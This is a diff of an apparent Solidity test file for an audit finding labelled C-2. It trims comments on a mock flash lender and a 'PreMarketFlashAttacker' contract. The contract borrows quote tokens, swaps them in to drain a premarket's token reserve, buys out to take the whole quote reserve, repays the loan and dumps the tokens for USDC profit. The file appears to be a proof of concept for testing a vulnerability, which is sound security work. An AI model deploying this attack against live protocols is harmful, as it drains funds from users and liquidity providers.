@@ -8,11 +8,7 @@ interface IFlashBorrower {
     function onFlashLoan(address asset, uint256 amount, bytes calldata data) external;
 }
 
-/**
- * @dev Minimal uncollateralised lender. Lends `amount` and requires its balance
- *      to be whole again by the end of the call — enough to prove the attack
- *      below needs no capital of its own in the borrowed asset.
- */
+/// @dev Test-only uncollateralised lender: its balance must be whole by the end of the call.
 contract MockFlashLender {
     using SafeERC20 for IERC20;
 
@@ -43,18 +39,9 @@ interface IPoolLike {
 
 /**
  * @title  PreMarketFlashAttacker
- * @notice Executes the C-2 round trip atomically, with the quote leg borrowed.
- *
- *         1. Borrow `quote` — no capital of the attacker's own.
- *         2. Swap all of it into the premarket, taking out the token reserve.
- *         3. Buy out. The buyout hands over the WHOLE quote reserve, which now
- *            includes the borrowed amount, so the deposit comes straight back.
- *         4. Repay the loan.
- *         5. Dump the tokens into the market the buyout just launched, so the
- *            profit is realised in USDC rather than left in an illiquid token.
- *
- *         Net USDC across the whole call is the number the test asserts on. The
- *         attack is only interesting if that number is positive.
+ * @notice Test-only swap-then-buyout round trip on borrowed quote: swap it in for
+ *         tokens, buy out (receiving the whole quote reserve), repay, and dump the
+ *         tokens into the launched market. Tests assert on net USDC.
  */
 contract PreMarketFlashAttacker is IFlashBorrower {
     using SafeERC20 for IERC20;
@@ -95,16 +82,12 @@ contract PreMarketFlashAttacker is IFlashBorrower {
         require(msg.sender == address(lender), "only lender");
         uint256 maxUsdc = abi.decode(data, (uint256));
 
-        // 2. Quote in, token out — drains the token reserve along the curve.
-        //    amount == 0 is the control case: a plain buyout with no inflation,
-        //    which is the legitimate auction and the baseline to beat.
+        // amount == 0 is the control case: a plain buyout.
         if (amount != 0) {
             quote.forceApprove(address(preMarket), amount);
             tokensTaken = preMarket.swap(amount, 0, false, address(this));
         }
 
-        // 3. Buy out. Cost is read off the auction; the entire quote reserve,
-        //    borrowed portion included, is transferred to this contract.
         uint256 usdcBefore  = usdc.balanceOf(address(this));
         uint256 quoteBefore = quote.balanceOf(address(this));
         usdc.forceApprove(address(preMarket), maxUsdc);
@@ -113,10 +96,9 @@ contract PreMarketFlashAttacker is IFlashBorrower {
         usdcPaid      = usdcBefore - usdc.balanceOf(address(this));
         quoteReceived = quote.balanceOf(address(this)) - quoteBefore;
 
-        // 4. Repay. Reverts inside the lender if the buyout did not return enough.
         quote.safeTransfer(address(lender), amount);
 
-        // 5. Realise the token side against the freshly launched market.
+        // Realise the tokens against the launched market.
         uint256 held = token.balanceOf(address(this));
         if (held != 0) {
             uint256 beforeDump = usdc.balanceOf(address(this));
